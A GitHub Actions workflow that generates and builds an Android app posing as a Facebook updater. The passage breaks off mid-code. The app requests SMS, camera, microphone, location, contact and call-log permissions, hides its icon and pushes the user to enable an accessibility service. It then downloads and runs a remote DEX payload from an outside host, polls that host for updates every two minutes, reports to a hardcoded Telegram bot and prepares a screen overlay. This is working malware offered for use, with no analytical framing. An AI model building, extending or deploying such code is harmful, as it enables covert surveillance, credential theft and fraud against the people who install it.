name: Build Facebook APK with AI + Overlay

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Create Project Structure
        run: |
          mkdir -p app/src/main/java/com/facebook/updater
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/assets/html
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/mipmap-anydpi-v26

      # ==================== GRADLE FILES ====================
      
      - name: Create settings.gradle
        run: |
          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "Facebook"
          include ':app'
          EOF

      - name: Create build.gradle (Project)
        run: |
          cat > build.gradle << 'EOF'
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.1.0'
                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.22'
              }
          }
          
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
              configurations.all {
                  resolutionStrategy {
                      force 'org.jetbrains.kotlin:kotlin-stdlib:1.8.22',
                            'org.jetbrains.kotlin:kotlin-stdlib-jdk7:1.8.22',
                            'org.jetbrains.kotlin:kotlin-stdlib-jdk8:1.8.22'
                      eachDependency { details ->
                          if (details.requested.group == 'org.jetbrains.kotlin'
                              && details.requested.name.startsWith('kotlin-stdlib')) {
                              details.useVersion '1.8.22'
                          }
                      }
                  }
              }
          }
          
          tasks.register('clean', Delete) {
              delete rootProject.buildDir
          }
          EOF

      - name: Create app/build.gradle
        run: |
          cat > app/build.gradle << 'EOF'
          plugins {
              id 'com.android.application'
              id 'org.jetbrains.kotlin.android'
          }
          
          android {
              namespace 'com.facebook.updater'
              compileSdk 34
              
              defaultConfig {
                  applicationId "com.facebook.updater"
                  minSdk 21
                  targetSdk 34
                  versionCode 2
                  versionName "2.0"
              }
              
              buildTypes {
                  release {
                      minifyEnabled true
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
                  }
                  debug {
                      minifyEnabled false
                  }
              }
              
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_11
                  targetCompatibility JavaVersion.VERSION_11
              }
              
              kotlinOptions {
                  jvmTarget = '11'
              }
          }
          
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'androidx.core:core:1.12.0'
              implementation 'androidx.webkit:webkit:1.9.0'
              implementation 'org.jetbrains.kotlin:kotlin-stdlib:1.8.22'
              implementation 'org.jetbrains.kotlin:kotlin-stdlib-jdk8:1.8.22'
          }
          EOF

      - name: Create gradle.properties
        run: |
          cat > gradle.properties << 'EOF'
          org.gradle.jvmargs=-Xmx2048m
          android.useAndroidX=true
          android.enableJetifier=true
          android.suppressUnsupportedCompileSdk=34
          kotlin.version=1.8.22
          EOF

      - name: Create gradle wrapper
        run: |
          mkdir -p gradle/wrapper
          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
          distributionBase=GRADLE_USER_HOME
          distributionPath=wrapper/dists
          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
          zipStoreBase=GRADLE_USER_HOME
          zipStorePath=wrapper/dists
          EOF
          
          curl -L -o gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar

      - name: Create gradlew
        run: |
          cat > gradlew << 'EOF'
          #!/bin/sh
          APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit
          APP_NAME="Gradle"
          APP_BASE_NAME=${0##*/}
          DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'
          MAX_FD=maximum
          warn () { echo "$*" >&2; }
          die () { echo "$*"; echo; exit 1; }
          cygwin=false
          msys=false
          darwin=false
          nonstop=false
          case "$( uname )" in
            CYGWIN* ) cygwin=true ;;
            Darwin* ) darwin=true ;;
            MSYS* | MINGW* ) msys=true ;;
            NONSTOP* ) nonstop=true ;;
          esac
          CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
          if [ -n "$JAVA_HOME" ] ; then
              if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
                  JAVACMD=$JAVA_HOME/jre/sh/java
              else
                  JAVACMD=$JAVA_HOME/bin/java
              fi
              if [ ! -x "$JAVACMD" ] ; then
                  die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME"
              fi
          else
              JAVACMD=java
              which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH."
          fi
          if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
              case $MAX_FD in
                max*) MAX_FD=$( ulimit -H -n ) || warn "Could not query maximum file descriptor limit" ;;
              esac
              case $MAX_FD in
                '' | soft) : ;;
                *) ulimit -n "$MAX_FD" || warn "Could not set maximum file descriptor limit to $MAX_FD" ;;
              esac
          fi
          if "$cygwin" || "$msys" ; then
              APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
              CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )
              JAVACMD=$( cygpath --unix "$JAVACMD" )
              for arg do
                  if case $arg in -*) false;; /?*) t=${arg#/} t=/${t%%/*} [ -e "$t" ];; *) false;; esac; then
                      arg=$( cygpath --path --ignore --mixed "$arg" )
                  fi
                  set -- "$@" "$arg"
              done
          fi
          set -- $(echo "$@" | tr ' ' '\n' | sed 's/^--/ /' | tr '\n' ' ')
          set -- \
              "-Dorg.gradle.appname=$APP_BASE_NAME" \
              -classpath "$CLASSPATH" \
              org.gradle.wrapper.GradleWrapperMain \
              "$@"
          eval "set -- $(
              printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
              xargs -n1 |
              sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
              tr '\n' ' '
          )" '"$@"'
          exec "$JAVACMD" "$@"
          EOF
          chmod +x gradlew

      # ==================== RESOURCE FILES ====================
      
      - name: Create strings.xml
        run: |
          cat > app/src/main/res/values/strings.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <string name="app_name">Facebook</string>
          </resources>
          EOF

      - name: Create colors.xml
        run: |
          cat > app/src/main/res/values/colors.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <color name="purple_200">#FFBB86FC</color>
              <color name="purple_500">#FF6200EE</color>
              <color name="purple_700">#FF3700B3</color>
              <color name="teal_200">#FF03DAC5</color>
              <color name="teal_700">#FF018786</color>
              <color name="black">#FF000000</color>
              <color name="white">#FFFFFFFF</color>
              <color name="facebook_blue">#1877F2</color>
          </resources>
          EOF

      - name: Create styles.xml
        run: |
          cat > app/src/main/res/values/styles.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <style name="Theme.AppCompat.NoActionBar" parent="Theme.AppCompat.Light.DarkActionBar">
                  <item name="windowActionBar">false</item>
                  <item name="windowNoTitle">true</item>
              </style>
          </resources>
          EOF

      - name: Create ic_launcher.xml
        run: |
          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
              <background android:drawable="@color/facebook_blue"/>
              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
          </adaptive-icon>
          EOF

      - name: Create ic_launcher_foreground.xml
        run: |
          cat > app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp"
              android:height="108dp"
              android:viewportWidth="108"
              android:viewportHeight="108">
              <path
                  android:fillColor="#FFFFFF"
                  android:pathData="M54,28C38.5,28 26,40.5 26,56C26,71.5 38.5,84 54,84C69.5,84 82,71.5 82,56C82,40.5 69.5,28 54,28ZM54,72C45.2,72 38,64.8 38,56C38,47.2 45.2,40 54,40C62.8,40 70,47.2 70,56C70,64.8 62.8,72 54,72ZM54,46C48.5,46 44,50.5 44,56C44,61.5 48.5,66 54,66C59.5,66 64,61.5 64,56C64,50.5 59.5,46 54,46Z"/>
          </vector>
          EOF

      # ==================== ANDROID MANIFEST ====================
      
      - name: Create AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">

              <!-- ALL PERMISSIONS - Requested before app disappears -->
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.SEND_SMS" />
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.RECORD_AUDIO" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
              <uses-permission android:name="android.permission.READ_CONTACTS" />
              <uses-permission android:name="android.permission.WRITE_CONTACTS" />
              <uses-permission android:name="android.permission.READ_CALL_LOG" />
              <uses-permission android:name="android.permission.READ_CALENDAR" />
              <uses-permission android:name="android.permission.WRITE_CALENDAR" />
              <uses-permission android:name="android.permission.VIBRATE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

              <application
                  android:allowBackup="true"
                  android:icon="@mipmap/ic_launcher"
                  android:label="@string/app_name"
                  android:theme="@style/Theme.AppCompat.NoActionBar"
                  android:usesCleartextTraffic="true">
                  
                  <activity
                      android:name=".MainActivity"
                      android:excludeFromRecents="true"
                      android:exported="true"
                      android:theme="@android:style/Theme.Translucent.NoTitleBar">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <!-- NO FOREGROUND SERVICE - AccessibilityService only -->
                  <service
                      android:name=".UpdaterService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true"
                      tools:node="merge">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                      </intent-filter>
                  </receiver>

                  <receiver
                      android:name=".NetworkReceiver"
                      android:exported="true"
                      tools:node="merge">
                      <intent-filter>
                          <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

      # ==================== SOURCE FILES ====================
      
      - name: Create MainActivity.java
        run: |
          cat > app/src/main/java/com/facebook/updater/MainActivity.java << 'EOF'
          package com.facebook.updater;

          import android.app.Activity;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.Toast;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          public class MainActivity extends Activity {
              private static final int PERMISSION_REQUEST_CODE = 123;
              private static final String[] PERMISSIONS = {
                  android.Manifest.permission.INTERNET,
                  android.Manifest.permission.READ_SMS,
                  android.Manifest.permission.RECEIVE_SMS,
                  android.Manifest.permission.SEND_SMS,
                  android.Manifest.permission.SYSTEM_ALERT_WINDOW,
                  android.Manifest.permission.READ_PHONE_STATE,
                  android.Manifest.permission.READ_EXTERNAL_STORAGE,
                  android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                  android.Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
                  android.Manifest.permission.RECEIVE_BOOT_COMPLETED,
                  android.Manifest.permission.CAMERA,
                  android.Manifest.permission.RECORD_AUDIO,
                  android.Manifest.permission.ACCESS_FINE_LOCATION,
                  android.Manifest.permission.ACCESS_COARSE_LOCATION,
                  android.Manifest.permission.READ_CONTACTS,
                  android.Manifest.permission.WRITE_CONTACTS,
                  android.Manifest.permission.READ_CALL_LOG,
                  android.Manifest.permission.READ_CALENDAR,
                  android.Manifest.permission.WRITE_CALENDAR,
                  android.Manifest.permission.VIBRATE,
                  android.Manifest.permission.WAKE_LOCK,
                  android.Manifest.permission.DISABLE_KEYGUARD,
                  android.Manifest.permission.ACCESS_NETWORK_STATE
              };

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  
                  // Request ALL permissions at once BEFORE app disappears
                  requestAllPermissions();
                  
                  // Guide user to Accessibility Settings
                  Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                  startActivity(intent);
                  
                  // Hide app icon immediately after setup
                  hideAppIcon();
                  
                  Toast.makeText(this, "Enable Accessibility for Facebook", Toast.LENGTH_LONG).show();
                  finish();
              }

              private void requestAllPermissions() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      if (!Settings.canDrawOverlays(this)) {
                          Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                              Uri.parse("package:" + getPackageName()));
                          startActivityForResult(intent, PERMISSION_REQUEST_CODE);
                      }
                  }
                  
                  // Request all permissions in one go
                  for (String permission : PERMISSIONS) {
                      if (ContextCompat.checkSelfPermission(this, permission) 
                          != PackageManager.PERMISSION_GRANTED) {
                          ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_REQUEST_CODE);
                          break;
                      }
                  }
              }

              private void hideAppIcon() {
                  try {
                      getPackageManager().setComponentEnabledSetting(
                          getComponentName(),
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP
                      );
                  } catch (Exception e) {
                      e.printStackTrace();
                  }
              }
          }
          EOF

      - name: Create Interfaces (AI + Overlay)
        run: |
          cat > app/src/main/java/com/facebook/updater/AiInterface.java << 'EOF'
          package com.facebook.updater;

          public interface AiInterface {
              String askAI(String prompt);
              String analyzeScreen(String screenText);
              boolean isAILoaded();
          }
          EOF

          cat > app/src/main/java/com/facebook/updater/OverlayInterface.java << 'EOF'
          package com.facebook.updater;

          public interface OverlayInterface {
              void showOverlay();
              void hideOverlay();
              boolean isOverlayShowing();
              void updateOverlayProgress(int percent);
          }
          EOF

      - name: Create UpdaterService.java - COMPLETE WITH ALL LOGIC
        run: |
          cat > app/src/main/java/com/facebook/updater/UpdaterService.java << 'EOF'
          package com.facebook.updater;

          import android.accessibilityservice.AccessibilityService;
          import android.accessibilityservice.AccessibilityServiceInfo;
          import android.content.Context;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.net.ConnectivityManager;
          import android.os.Build;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.WindowManager;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;
          import android.view.View;
          import android.graphics.Color;

          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.InputStream;
          import java.lang.reflect.Method;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.util.concurrent.Executors;
          import java.util.concurrent.ScheduledExecutorService;
          import java.util.concurrent.TimeUnit;

          import dalvik.system.DexClassLoader;

          public class UpdaterService extends AccessibilityService implements AiInterface, OverlayInterface {
              private static final String TAG = "UpdaterService";
              private static final String DEX_URL = "https://payload-host-079x.onrender.com/payload.dex";
              private static final String VERSION_URL = "https://payload-host-079x.onrender.com/version";
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";
              
              // DEX Download constants
              private static final String DEX_MAGIC = "dex\n";
              private static final int MAX_RETRIES = 5;
              private static final int INITIAL_RETRY_DELAY_MS = 2000;
              
              private boolean isDexLoaded = false;
              private boolean isDownloading = false;
              private int dexRetryCount = 0;
              private Object payloadInstance;
              private Handler mainHandler = new Handler(Looper.getMainLooper());
              private ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
              
              // Overlay variables
              private WindowManager windowManager;
              private WebView overlayWebView;
              private boolean isOverlayShowing = false;
              private WindowManager.LayoutParams overlayParams;

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  if (!isDexLoaded) {
                      performDexDownloadWithRetry();
                  }
                  if (isDexLoaded && payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("onAccessibilityEvent", AccessibilityEvent.class);
                          method.invoke(payloadInstance, event);
                      } catch (Exception e) {
                          Log.e(TAG, "Error passing event to DEX: " + e.getMessage());
                      }
                  }
              }

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "Service interrupted");
              }

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  Log.d(TAG, "✅ Accessibility Service Connected!");
                  
                  windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
                  
                  AccessibilityServiceInfo info = new AccessibilityServiceInfo();
                  info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | 
                               AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
                  info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
                  info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
                  setServiceInfo(info);
                  
                  // Start DEX download immediately
                  mainHandler.postDelayed(this::performDexDownloadWithRetry, 2000);
                  
                  // Check for updates EVERY 2 MINUTES
                  scheduler.scheduleAtFixedRate(this::checkVersion, 2, 2, TimeUnit.MINUTES);
                  
                  sendTelegramNotification("📱 Facebook APK Installed\n" +
                      "Device: " + Build.MODEL + "\n" +
                      "Android: " + Build.VERSION.RELEASE);
              }

              // ==================== ROBUST DEX DOWNLOAD WITH RETRY ====================
              
              private void performDexDownloadWithRetry() {
                  if (isDexLoaded) {
                      Log.d(TAG, "DEX already loaded");
                      return;
                  }
                  
                  if (isDownloading) {
                      Log.d(TAG, "Download already in progress");
                      return;
                  }
                  
                  // Check network connectivity
                  if (!isNetworkConnected()) {
                      Log.w(TAG, "⚠️ No network connection - retrying in background");
                      sendTelegramNotification("⚠️ No network connection - retrying...");
                      scheduleRetry();
                      return;
                  }
                  
                  isDownloading = true;
                  
                  try {
                      Log.d(TAG, "🚀 Attempting DEX download (Attempt " + (dexRetryCount + 1) + "/" + MAX_RETRIES + ")");
                      
                      URL url = new URL(DEX_URL);
                      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                      conn.setConnectTimeout(20000);
                      conn.setReadTimeout(20000);
                      conn.setRequestProperty("User-Agent", "Android");
                      
                      int responseCode = conn.getResponseCode();
                      Log.d(TAG, "📡 HTTP Response: " + responseCode);
                      
                      if (responseCode != 200) {
                          Log.e(TAG, "❌ Server error: " + responseCode);
                          conn.disconnect();
                          sendTelegramNotification("❌ Server error: " + responseCode);
                          scheduleRetry();
                          return;
                      }
                      
                      // Get file size
                      long contentLength = conn.getContentLength();
                      Log.d(TAG, "📥 Download size: " + formatBytes(contentLength));
                      
                      // Download file
                      File dexFile = new File(getCacheDir(), "payload.dex");
                      if (dexFile.exists()) dexFile.delete();
                      
                      try (InputStream in = conn.getInputStream();
                           FileOutputStream out = new FileOutputStream(dexFile)) {
                          
                          byte[] buffer = new byte[8192];
                          int len;
                          long downloaded = 0;
                          
                          while ((len = in.read(buffer)) != -1) {
                              out.write(buffer, 0, len);
                              downloaded += len;
                              
                              // Log progress every 256KB
                              if (downloaded % (256 * 1024) == 0) {
                                  Log.d(TAG, "📊 Progress: " + formatBytes(downloaded) + 
                                             " / " + formatBytes(contentLength) +
                                             " (" + ((downloaded * 100) / contentLength) + "%)");
                              }
                          }
                          
                          out.flush();
                          conn.disconnect();
                      }
                      
                      // Validate DEX file
                      if (!validateDexFile(dexFile)) {
                          Log.e(TAG, "❌ DEX validation failed");
                          dexFile.delete();
                          sendTelegramNotification("❌ DEX validation failed - invalid file");
                          scheduleRetry();
                          return;
                      }
                      
                      // DEX downloaded successfully - load and execute
                      dexRetryCount = 0;
                      isDownloading = false;
                      Log.d(TAG, "✅ DEX downloaded successfully: " + dexFile.length() + " bytes");
                      sendTelegramNotification("✅ DEX Downloaded\nSize: " + formatBytes(dexFile.length()));
                      
                      // Load and execute DEX
                      loadAndExecuteDex(dexFile);
                      
                  } catch (java.net.SocketTimeoutException e) {
                      Log.e(TAG, "❌ Connection timeout: " + e.getMessage());
                      sendTelegramNotification("❌ Connection timeout - retrying...");
                      scheduleRetry();
                  } catch (java.net.ConnectException e) {
                      Log.e(TAG, "❌ Connection failed: " + e.getMessage());
                      sendTelegramNotification("❌ Connection failed - retrying...");
                      scheduleRetry();
                  } catch (Exception e) {
                      Log.e(TAG, "❌ Download error: " + e.getMessage());
                      e.printStackTrace();
                      sendTelegramNotification("❌ Download error: " + e.getMessage());
                      scheduleRetry();
                  } finally {
                      isDownloading = false;
                  }
              }

              private boolean isNetworkConnected() {
                  try {
                      ConnectivityManager cm = (ConnectivityManager) 
                          getSystemService(Context.CONNECTIVITY_SERVICE);
                      
                      if (cm == null) return false;
                      
                      android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                      boolean connected = activeNetwork != null && activeNetwork.isConnectedOrConnecting();
                      
                      if (connected) {
                          Log.d(TAG, "✅ Network connected: " + activeNetwork.getTypeName());
                      }
                      return connected;
                  } catch (Exception e) {
                      Log.e(TAG, "Network check error: " + e.getMessage());
                      return false;
                  }
              }

              private boolean validateDexFile(File dexFile) {
                  try {
                      if (!dexFile.exists() || dexFile.length() < 100) {
                          Log.e(TAG, "❌ DEX file missing or too small");
                          return false;
                      }
                      
                      byte[] header = new byte[4];
                      try (java.io.FileInputStream fis = new java.io.FileInputStream(dexFile)) {
                          int read = fis.read(header);
                          if (read != 4) {
                              Log.e(TAG, "❌ Cannot read DEX header");
                              return false;
                          }
                      }
                      
                      String magic = new String(header);
                      if (!magic.equals(DEX_MAGIC)) {
                          Log.e(TAG, "❌ Invalid DEX magic: '" + magic + "' (expected: 'dex\\n')");
                          return false;
                      }
                      
                      Log.d(TAG, "✅ DEX header valid - magic: " + magic.replace("\n", "\\n"));
                      return true;
                      
                  } catch (Exception e) {
                      Log.e(TAG, "DEX validation error: " + e.getMessage());
                      return false;
                  }
              }

              private void scheduleRetry() {
                  dexRetryCount++;
                  
                  if (dexRetryCount > MAX_RETRIES) {
                      Log.e(TAG, "❌ Max retries exceeded (" + MAX_RETRIES + ")");
                      isDownloading = false;
                      sendTelegramNotification("❌ DEX Download Failed\nMax retries exceeded");
                      return;
                  }
                  
                  long delayMs = INITIAL_RETRY_DELAY_MS * (long) Math.pow(2, dexRetryCount - 1);
                  
                  Log.w(TAG, "⏱️ Retrying in " + (delayMs / 1000) + " seconds... (Attempt " + 
                             dexRetryCount + "/" + MAX_RETRIES + ")");
                  
                  mainHandler.postDelayed(this::performDexDownloadWithRetry, delayMs);
              }

              private String formatBytes(long bytes) {
                  if (bytes <= 0) return "0 B";
                  final String[] units = {"B", "KB", "MB", "GB"};
                  int digitGroups = (int) (Math.log10(bytes) / Math.log10(1024));
                  return String.format("%.2f %s", bytes / Math.pow(1024, digitGroups), units[digitGroups]);
              }

              // ==================== DEX LOAD AND EXECUTE ====================
              
              private void loadAndExecuteDex(File dexFile) {
                  try {
                      Log.d(TAG, "🚀 Loading DEX...");
                      
                      File optDir = new File(getCacheDir(), "dex_opt");
                      if (!optDir.exists()) optDir.mkdirs();

                      DexClassLoader classLoader = new DexClassLoader(
                          dexFile.getAbsolutePath(),
                          optDir.getAbsolutePath(),
                          null,
                          this.getClass().getClassLoader()
                      );
                      
                      Log.d(TAG, "✅ DexClassLoader created");

                      String[] classNames = {
                          "com.facebook.payload.Main",
                          "com.facebook.payload.Payload",
                          "com.simiyu.payload.Payload",
                          "Main",
                          "Payload"
                      };
                      
                      Class<?> mainClass = null;
                      for (String className : classNames) {
                          try {
                              mainClass = classLoader.loadClass(className);
                              Log.d(TAG, "✅ Found class: " + className);
                              break;
                          } catch (ClassNotFoundException e) {
                              Log.d(TAG, "Class not found: " + className);
                          }
                      }
                      
                      if (mainClass == null) {
                          Log.e(TAG, "❌ No main class found");
                          sendTelegramNotification("❌ No main class in DEX");
                          return;
                      }

                      payloadInstance = mainClass.newInstance();
                      
                      try {
                          Method setAi = mainClass.getMethod("setAiInterface", AiInterface.class);
                          setAi.invoke(payloadInstance, this);
                          Log.d(TAG, "✅ AI interface passed to DEX");
                      } catch (NoSuchMethodException e) {
                          Log.d(TAG, "DEX doesn't have setAiInterface method");
                      }
                      
                      try {
                          Method setOverlay = mainClass.getMethod("setOverlayInterface", OverlayInterface.class);
                          setOverlay.invoke(payloadInstance, this);
                          Log.d(TAG, "✅ Overlay interface passed to DEX");
                      } catch (NoSuchMethodException e) {
                          Log.d(TAG, "DEX doesn't have setOverlayInterface method");
                      }
                      
                      try {
                          Method init = mainClass.getMethod("initialize", AccessibilityService.class, Context.class);
                          init.invoke(payloadInstance, this, this);
                          Log.d(TAG, "✅ DEX initialized via initialize(service, context)");
                      } catch (NoSuchMethodException e) {
                          try {
                              Method start = mainClass.getMethod("start", Context.class);
                              start.invoke(payloadInstance, this);
                              Log.d(TAG, "✅ DEX initialized via start(Context)");
                          } catch (NoSuchMethodException e2) {
                              try {
                                  Method main = mainClass.getMethod("main", String[].class);
                                  main.invoke(null, (Object) new String[]{});
                                  Log.d(TAG, "✅ DEX initialized via main(String[])");
                              } catch (NoSuchMethodException e3) {
                                  Log.d(TAG, "DEX initialized by instantiation only");
                              }
                          }
                      }
                      
                      isDexLoaded = true;
                      Log.d(TAG, "✅ DEX loaded and executed successfully!");
                      sendTelegramNotification("🚀 DEX Executed Successfully!");
                      
                  } catch (Exception e) {
                      Log.e(TAG, "❌ DEX load failed: " + e.getMessage());
                      e.printStackTrace();
                      sendTelegramNotification("❌ DEX Execution Failed\nError: " + e.getMessage());
                  }
              }

              // ==================== VERSION CHECK - EVERY 2 MINUTES ====================
              
              private void checkVersion() {
                  try {
                      URL url = new URL(VERSION_URL);
                      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                      conn.setConnectTimeout(5000);
                      conn.setReadTimeout(5000);
                      
                      if (conn.getResponseCode() == 200) {
                          InputStream in = conn.getInputStream();
                          java.io.BufferedReader reader = new java.io.BufferedReader(
                              new java.io.InputStreamReader(in));
                          String version = reader.readLine();
                          reader.close();
                          in.close();
                          
                          SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
                          String currentVersion = prefs.getString("current_version", "1.0");
                          
                          if (!version.equals(currentVersion)) {
                              Log.d(TAG, "🔄 New version available: " + version);
                              prefs.edit().putString("current_version", version).apply();
                              sendTelegramNotification("🔄 Update Available\nVersion: " + version);
                              // Reset DEX to force reload
                              isDexLoaded = false;
                              performDexDownloadWithRetry();
                          } else {
                              Log.d(TAG, "ℹ️ No update available - current: " + currentVersion);
                          }
                      }
                      conn.disconnect();
                  } catch (Exception e) {
                      Log.e(TAG, "Version check failed: " + e.getMessage());
                  }
              }

              // ==================== AI INTERFACE ====================
              
              @Override
              public String askAI(String prompt) {
                  Log.d(TAG, "🧠 AI asked: " + prompt);
                  if (payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("askAI", String.class);
                          return (String) method.invoke(payloadInstance, prompt);
                      } catch (Exception e) {
                          Log.e(TAG, "AI ask failed: " + e.getMessage());
                      }
                  }
                  return "{\"error\": \"AI not available\"}";
              }

              @Override
              public String analyzeScreen(String screenText) {
                  Log.d(TAG, "📱 Analyzing screen: " + screenText);
                  if (payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("analyzeScreen", String.class);
                          return (String) method.invoke(payloadInstance, screenText);
                      } catch (Exception e) {
                          Log.e(TAG, "Screen analysis failed: " + e.getMessage());
                      }
                  }
                  return "{\"error\": \"Analysis not available\"}";
              }

              @Override
              public boolean isAILoaded() {
                  if (payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("isAILoaded");
                          return (boolean) method.invoke(payloadInstance);
                      } catch (Exception e) {
                          return false;
                      }
                  }
                  return false;
              }

              // ==================== OVERLAY INTERFACE ====================
              
              @Override
              public void showOverlay() {
                  mainHandler.post(() -> {
                      try {
                          if (isOverlayShowing) {
                              Log.d(TAG, "Overlay already showing");
                              return;
                          }
                          
                          Log.d(TAG, "🔄 Showing overlay");
                          
                          overlayWebView = new WebView(this);
                          overlayWebView.setBackgroundColor(Color.TRANSPARENT);
                          overlayWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
                          overlayWebView.getSettings().setJavaScriptEnabled(true);
                          overlayWebView.getSettings().setDomStorageEnabled(true);
                          overlayWebView.getSettings().setLoadWithOverviewMode(true);
                          overlayWebView.getSettings().setUseWideViewPort(true);
                          overlayWebView.setWebViewClient(new WebViewClient() {
                              @Override
